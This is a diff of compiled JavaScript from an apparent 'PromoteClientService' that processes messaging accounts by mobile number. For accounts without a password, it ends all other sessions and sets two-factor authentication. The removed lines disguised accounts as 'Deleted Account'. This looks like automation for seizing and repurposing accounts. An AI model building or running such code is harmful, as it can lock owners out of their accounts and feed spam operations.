@@ -860,16 +860,10 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
                     this.logger.debug(`hasPassword for ${document.mobile}: ${hasPassword}`);
                     if (!hasPassword) {
                         await client.removeOtherAuths();
+                        await (0, Helpers_1.sleep)(10000);
                         await client.set2fa();
                         this.logger.debug('Waiting for setting 2FA');
                         await (0, Helpers_1.sleep)(30000);
-                        await client.updateUsername('');
-                        await (0, Helpers_1.sleep)(3000);
-                        await client.updatePrivacyforDeletedAccount();
-                        await (0, Helpers_1.sleep)(3000);
-                        await client.updateProfile('Deleted Account', 'Deleted Account');
-                        await (0, Helpers_1.sleep)(3000);
-                        await client.deleteProfilePhotos();
                         const channels = await (0, channelinfo_1.channelInfo)(client.client, true);
                         this.logger.debug(`Inserting Document for client ${targetClientId}`);
                         const promoteClient = {
@@ -892,9 +886,6 @@ let PromoteClientService = PromoteClientService_1 = class PromoteClientService {
                         catch (userUpdateError) {
                             this.logger.warn(`Failed to update user 2FA status for ${document.mobile}:`, userUpdateError);
                         }
-                        await this.sessionService.getOldestSessionOrCreate({
-                            mobile: document.mobile
-                        });
                         this.logger.log(`=============Created PromoteClient for ${targetClientId}==============`);
                     }
                     else {
